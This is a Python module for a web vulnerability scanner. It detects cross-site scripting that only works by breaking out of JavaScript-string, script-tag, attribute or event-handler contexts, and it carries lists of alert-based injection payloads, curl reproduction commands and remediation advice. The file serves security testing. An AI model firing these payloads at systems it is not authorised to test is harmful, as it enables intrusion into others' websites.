#!/usr/bin/env python3
"""
XSS Breakout Context Detector

Detects XSS vulnerabilities that ONLY work by breaking out of existing contexts:
- JavaScript string contexts (e.g., var x = 'USER_INPUT')
- JavaScript variable assignments
- Script tag contents
- HTML attribute values
- Event handler attributes

This module enhances the standard XSS scanner to identify when simple payloads
fail but context breakout payloads succeed, indicating the input is embedded
in a restrictive context that requires escaping.
"""

import httpx
import urllib.parse
import re
import json
from typing import List, Dict, Tuple, Optional
from html.parser import HTMLParser
from dataclasses import dataclass


@dataclass
class BreakoutContext:
    """Information about a detected breakout scenario"""
    context_type: str  # 'js_string', 'js_variable', 'script_tag', 'html_attribute', 'event_handler'
    surrounding_code: str  # The actual code context found
    required_escape: str  # What needs to be escaped to break out
    breakout_payloads: List[str]  # Specific payloads that work
    simple_payloads_blocked: bool  # Whether simple XSS payloads were blocked
    

class BreakoutPayloadGenerator:
    """Generate context-specific breakout payloads"""
    
    @staticmethod
    def get_js_string_breakouts() -> List[Dict[str, str]]:
        """
        Payloads for breaking out of JavaScript string contexts
        Example: var search = 'USER_INPUT';
        """
        return [
            {
                'payload': "'</script><script>alert('XSS')</script>",
                'description': "Single quote escape + script tag closure",
                'context': 'js_string_single'
            },
            {
                'payload': '"</script><script>alert("XSS")</script>',
                'description': "Double quote escape + script tag closure",
                'context': 'js_string_double'
            },
            {
                'payload': "';alert('XSS');//",
                'description': "Single quote escape + statement injection",
                'context': 'js_string_single'
            },
            {
                'payload': '";alert("XSS");//',
                'description': "Double quote escape + statement injection",
                'context': 'js_string_double'
            },
            {
                'payload': "'-alert('XSS')-'",
                'description': "String concatenation with alert",
                'context': 'js_string_single'
            },
            {
                'payload': '"+alert("XSS")+"',
                'description': "String concatenation with alert",
                'context': 'js_string_double'
            },
            {
                'payload': "\\'; alert('XSS'); //",
                'description': "Backslash escape bypass",
                'context': 'js_string_single'
            },
        ]
    
    @staticmethod
    def get_script_tag_breakouts() -> List[Dict[str, str]]:
        """
        Payloads for breaking out of script tag content
        Example: <script>var data = USER_INPUT;</script>
        """
        return [
            {
                'payload': "</script><script>alert('XSS')</script>",
                'description': "Close script tag and open new one",
                'context': 'script_tag'
            },
            {
                'payload': "</script><img src=x onerror=alert('XSS')>",
                'description': "Close script tag and inject HTML",
                'context': 'script_tag'
            },
            {
                'payload': "</script><svg/onload=alert('XSS')>",
                'description': "Close script tag and inject SVG",
                'context': 'script_tag'
            },
            {
                'payload': "</ScRiPt><script>alert('XSS')</script>",
                'description': "Case variation bypass",
                'context': 'script_tag'
            },
        ]
    
    @staticmethod
    def get_html_attribute_breakouts() -> List[Dict[str, str]]:
        """
        Payloads for breaking out of HTML attribute values
        Example: <input value="USER_INPUT">
        """
        return [
            {
                'payload': '" onload="alert(\'XSS\')',
                'description': "Double quote escape + event handler",
                'context': 'html_attribute_double'
            },
            {
                'payload': "' onload='alert(\"XSS\")",
                'description': "Single quote escape + event handler",
                'context': 'html_attribute_single'
            },
            {
                'payload': '"><script>alert("XSS")</script>',
                'description': "Close attribute and tag + script injection",
                'context': 'html_attribute_double'
            },
            {
                'payload': "'><script>alert('XSS')</script>",
                'description': "Close attribute and tag + script injection",
                'context': 'html_attribute_single'
            },
            {
                'payload': '" autofocus onfocus="alert(\'XSS\')',
                'description': "Attribute injection with event handler",
                'context': 'html_attribute_double'
            },
        ]
    
    @staticmethod
    def get_event_handler_breakouts() -> List[Dict[str, str]]:
        """
        Payloads for breaking out of event handler attributes
        Example: <div onclick="doSomething('USER_INPUT')">
        """
        return [
            {
                'payload': "');alert('XSS');//",
                'description': "Close function call + statement injection",
                'context': 'event_handler_single'
            },
            {
                'payload': '");alert("XSS");//',
                'description': "Close function call + statement injection",
                'context': 'event_handler_double'
            },
            {
                'payload': "'-alert('XSS')-'",
                'description': "Expression injection",
                'context': 'event_handler_single'
            },
        ]
    
    @staticmethod
    def get_simple_test_payloads() -> List[str]:
        """
        Simple payloads that should work if NO context restriction exists
        If these fail but breakout payloads succeed, we have a breakout scenario
        """
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
        ]


class BreakoutContextAnalyzer:
    """Analyze response to determine exact breakout context"""
    
    @staticmethod
    def find_reflection_context(html: str, marker: str) -> Optional[BreakoutContext]:
        """
        Find where the marker is reflected and analyze the context
        
        Returns:
            BreakoutContext object if context is found, None otherwise
        """
        if marker not in html:
            return None
        
        pos = html.find(marker)
        # Get 300 chars before and after for context analysis
        start = max(0, pos - 300)
        end = min(len(html), pos + len(marker) + 300)
        context = html[start:end]
        
        # Pattern 1: Inside JavaScript string (single quote)
        pattern = r"var\s+\w+\s*=\s*'[^']*" + re.escape(marker) + "[^']*'"
        match = re.search(pattern, context, re.IGNORECASE | re.DOTALL)
        if match:
            return BreakoutContext(
                context_type='js_string_single',
                surrounding_code=match.group(0),
                required_escape="Single quote (') and script tag closure",
                breakout_payloads=BreakoutPayloadGenerator.get_js_string_breakouts(),
                simple_payloads_blocked=True
            )
        
        # Pattern 2: Inside JavaScript string (double quote)
        pattern = r'var\s+\w+\s*=\s*"[^"]*' + re.escape(marker) + '[^"]*"'
        match = re.search(pattern, context, re.IGNORECASE | re.DOTALL)
        if match:
            return BreakoutContext(
                context_type='js_string_double',
                surrounding_code=match.group(0),
                required_escape='Double quote (") and script tag closure',
                breakout_payloads=BreakoutPayloadGenerator.get_js_string_breakouts(),
                simple_payloads_blocked=True
            )
        
        # Pattern 3: Inside script tag but not in string
        pattern = r'<script[^>]*>[^<]*' + re.escape(marker)
        match = re.search(pattern, context, re.IGNORECASE | re.DOTALL)
        if match:
            return BreakoutContext(
                context_type='script_tag',
                surrounding_code=match.group(0),
                required_escape='</script> tag closure',
                breakout_payloads=BreakoutPayloadGenerator.get_script_tag_breakouts(),
                simple_payloads_blocked=True
            )
        
        # Pattern 4: Inside HTML attribute value (double quote)
        pattern = r'<[^>]+\s+\w+\s*=\s*"[^"]*' + re.escape(marker)
        match = re.search(pattern, context, re.IGNORECASE)
        if match:
            return BreakoutContext(
                context_type='html_attribute_double',
                surrounding_code=match.group(0),
                required_escape='Double quote and tag closure',
                breakout_payloads=BreakoutPayloadGenerator.get_html_attribute_breakouts(),
                simple_payloads_blocked=True
            )
        
        # Pattern 5: Inside HTML attribute value (single quote)
        pattern = r"<[^>]+\s+\w+\s*=\s*'[^']*" + re.escape(marker)
        match = re.search(pattern, context, re.IGNORECASE)
        if match:
            return BreakoutContext(
                context_type='html_attribute_single',
                surrounding_code=match.group(0),
                required_escape="Single quote and tag closure",
                breakout_payloads=BreakoutPayloadGenerator.get_html_attribute_breakouts(),
                simple_payloads_blocked=True
            )
        
        # Pattern 6: Inside event handler
        pattern = r'<[^>]+\s+on\w+\s*=\s*["\'][^"\']*' + re.escape(marker)
        match = re.search(pattern, context, re.IGNORECASE)
        if match:
            quote_type = 'single' if "'" in match.group(0) else 'double'
            return BreakoutContext(
                context_type=f'event_handler_{quote_type}',
                surrounding_code=match.group(0),
                required_escape=f'{quote_type.capitalize()} quote and statement closure',
                breakout_payloads=BreakoutPayloadGenerator.get_event_handler_breakouts(),
                simple_payloads_blocked=True
            )
        
        return None
    
    @staticmethod
    def extract_context_snippet(html: str, marker: str, chars_before: int = 100, chars_after: int = 100) -> str:
        """
        Extract a readable snippet showing the marker in context
        """
        pos = html.find(marker)
        if pos == -1:
            return "[Marker not found in response]"
        
        start = max(0, pos - chars_before)
        end = min(len(html), pos + len(marker) + chars_after)
        snippet = html[start:end]
        
        # Highlight the marker
        snippet = snippet.replace(marker, f">>>{marker}<<<")
        
        return snippet


def detect_breakout_xss(url: str,
                        param_name: str = None,
                        method: str = 'GET',
                        form_data: Dict = None,
                        timeout: int = 10) -> Optional[Dict]:
    """
    Test a specific parameter for breakout XSS scenarios
    
    This function determines if XSS is possible ONLY through context breakout,
    not through simple payload injection.
    
    Args:
        url: Target URL
        param_name: Parameter name to test (for GET) or form field name (for POST)
        method: HTTP method ('GET' or 'POST')
        form_data: Form data dict (for POST requests)
        timeout: Request timeout
    
    Returns:
        Dictionary with breakout XSS details if found, None otherwise
    """
    marker = "__BREAKOUT_TEST_MARKER_" + str(hash(url + str(param_name)))[-8:] + "__"
    
    try:
        with httpx.Client(timeout=timeout, follow_redirects=True, verify=False) as client:
            
            # Step 1: Test with marker to identify context
            if method == 'GET':
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                params[param_name] = [marker]
                flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                response = client.get(f"{parsed.scheme}://{parsed.netloc}{parsed.path}", params=flat_params)
            else:  # POST
                test_data = form_data.copy() if form_data else {}
                test_data[param_name] = marker
                response = client.post(url, data=test_data)
            
            # Analyze the context
            context = BreakoutContextAnalyzer.find_reflection_context(response.text, marker)
            
            if not context:
                # Marker not reflected or in a context we don't recognize
                return None
            
            # Step 2: Verify simple payloads are blocked
            simple_payloads = BreakoutPayloadGenerator.get_simple_test_payloads()
            simple_payload_worked = False
            
            for simple_payload in simple_payloads:
                if method == 'GET':
                    params[param_name] = [simple_payload]
                    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    test_response = client.get(f"{parsed.scheme}://{parsed.netloc}{parsed.path}", params=flat_params)
                else:
                    test_data[param_name] = simple_payload
                    test_response = client.post(url, data=test_data)
                
                # Check if payload executed (not encoded)
                if simple_payload in test_response.text and not is_html_encoded(test_response.text, simple_payload):
                    simple_payload_worked = True
                    break
            
            if simple_payload_worked:
                # If simple payloads work, it's not a breakout scenario
                return None
            
            # Step 3: Test breakout-specific payloads
            successful_breakout = None
            
            for payload_info in context.breakout_payloads:
                payload = payload_info['payload']
                
                # Filter payloads by context match
                if payload_info.get('context') and payload_info['context'] != context.context_type:
                    continue
                
                if method == 'GET':
                    params[param_name] = [payload]
                    flat_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                    test_response = client.get(f"{parsed.scheme}://{parsed.netloc}{parsed.path}", params=flat_params)
                else:
                    test_data[param_name] = payload
                    test_response = client.post(url, data=test_data)
                
                # Check if breakout payload worked
                if is_breakout_successful(test_response.text, payload, context.context_type):
                    successful_breakout = payload_info
                    break
            
            if not successful_breakout:
                # No breakout payload worked
                return None
            
            # Step 4: Generate detailed report
            context_snippet = BreakoutContextAnalyzer.extract_context_snippet(response.text, marker)
            
            result = {
                'vulnerability_type': 'breakout_xss',
                'context_type': context.context_type,
                'context_description': get_context_description(context.context_type),
                'parameter': param_name,
                'method': method,
                'url': url,
                'surrounding_code': context.surrounding_code,
                'context_snippet': context_snippet,
                'required_escape': context.required_escape,
                'successful_payload': successful_breakout['payload'],
                'payload_description': successful_breakout['description'],
                'simple_payloads_blocked': True,
                'severity': 'high',
                'remediation': generate_remediation(context.context_type),
                'exploitation': {
                    'curl_command': generate_curl_command(url, method, param_name, successful_breakout['payload'], form_data),
                    'explanation': generate_exploitation_explanation(context.context_type, successful_breakout),
                },
            }
            
            return result
    
    except Exception as e:
        print(f"Error in breakout detection: {str(e)}")
        return None


def is_html_encoded(html: str, payload: str) -> bool:
    """Check if payload is HTML encoded in the response"""
    encoded_patterns = [
        payload.replace('<', '&lt;').replace('>', '&gt;'),
        payload.replace('<', '&#60;').replace('>', '&#62;'),
        payload.replace('<', '&#x3C;').replace('>', '&#x3E;'),
    ]
    
    return any(encoded in html for encoded in encoded_patterns)


def is_breakout_successful(html: str, payload: str, context_type: str) -> bool:
    """
    Determine if a breakout payload successfully escaped the context
    """
    # Check if payload is present and not encoded
    if payload not in html or is_html_encoded(html, payload):
        return False
    
    # For script tag breakouts, check if </script> appears before alert/XSS code
    if 'script' in context_type or context_type == 'script_tag':
        if '</script>' in payload.lower() or '</script' in payload.lower():
            # Verify the script tag was actually closed and new content injected
            return True
    
    # For JavaScript string breakouts, check for quote escape
    if 'js_string' in context_type:
        if ("'" in payload or '"' in payload) and ('alert' in payload or 'script' in payload.lower()):
            return True
    
    # For attribute breakouts, check for quote and tag closure
    if 'attribute' in context_type:
        if ('">' in payload or "'" in payload) and ('on' in payload or 'script' in payload.lower()):
            return True
    
    return False


def get_context_description(context_type: str) -> str:
    """Get human-readable description of context type"""
    descriptions = {
        'js_string_single': "JavaScript string with single quotes (e.g., var x = 'USER_INPUT')",
        'js_string_double': 'JavaScript string with double quotes (e.g., var x = "USER_INPUT")',
        'script_tag': "Inside <script> tag content",
        'html_attribute_single': "HTML attribute value with single quotes (e.g., <input value='USER_INPUT'>)",
        'html_attribute_double': 'HTML attribute value with double quotes (e.g., <input value="USER_INPUT">)',
        'event_handler_single': "Event handler with single quotes (e.g., onclick='func(\'USER_INPUT\')')",
        'event_handler_double': 'Event handler with double quotes (e.g., onclick="func(\"USER_INPUT\")")',
    }
    return descriptions.get(context_type, "Unknown context")


def generate_remediation(context_type: str) -> str:
    """Generate context-specific remediation advice"""
    remediations = {
        'js_string_single': "Properly escape JavaScript strings using JSON.stringify() or equivalent escaping that handles quotes, backslashes, and script tags. Never concatenate user input directly into JavaScript code.",
        'js_string_double': "Properly escape JavaScript strings using JSON.stringify() or equivalent escaping that handles quotes, backslashes, and script tags. Never concatenate user input directly into JavaScript code.",
        'script_tag': "Avoid placing user input inside <script> tags. If necessary, use proper JavaScript escaping and Content Security Policy (CSP) to prevent inline script execution.",
        'html_attribute_single': "HTML-encode all user input placed in attribute values. Use proper attribute value escaping that handles quotes and tag closures.",
        'html_attribute_double': "HTML-encode all user input placed in attribute values. Use proper attribute value escaping that handles quotes and tag closures.",
        'event_handler_single': "Never place user input in event handler attributes. If absolutely necessary, use strict JavaScript encoding and implement CSP.",
        'event_handler_double': "Never place user input in event handler attributes. If absolutely necessary, use strict JavaScript encoding and implement CSP.",
    }
    return remediations.get(context_type, "Implement proper output encoding for the detected context.")


def generate_curl_command(url: str, method: str, param_name: str, payload: str, form_data: Dict = None) -> str:
    """Generate curl command for reproduction"""
    if method == 'GET':
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        params[param_name] = [payload]
        query = urllib.parse.urlencode(params, doseq=True)
        return f"curl -X GET '{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}'"
    else:
        data = form_data.copy() if form_data else {}
        data[param_name] = payload
        data_str = urllib.parse.urlencode(data)
        return f"curl -X POST -d '{data_str}' '{url}'"


def generate_exploitation_explanation(context_type: str, payload_info: Dict) -> str:
    """Generate detailed explanation of how the exploit works"""
    base = f"This vulnerability requires breaking out of a {get_context_description(context_type)}. "
    
    if 'js_string' in context_type:
        return base + f"The payload '{payload_info['payload']}' works by first closing the JavaScript string with a quote, then either closing the script tag entirely or injecting a new JavaScript statement. {payload_info['description']}."
    
    elif context_type == 'script_tag':
        return base + f"The payload '{payload_info['payload']}' closes the existing <script> tag with </script>, then injects new HTML/JavaScript. {payload_info['description']}."
    
    elif 'attribute' in context_type:
        return base + f"The payload '{payload_info['payload']}' escapes the attribute value by closing the quote, then either closes the HTML tag to inject new elements or adds a new event handler attribute. {payload_info['description']}."
    
    elif 'event_handler' in context_type:
        return base + f"The payload '{payload_info['payload']}' breaks out of the function call context and injects a new JavaScript statement. {payload_info['description']}."
    
    return base + payload_info['description']
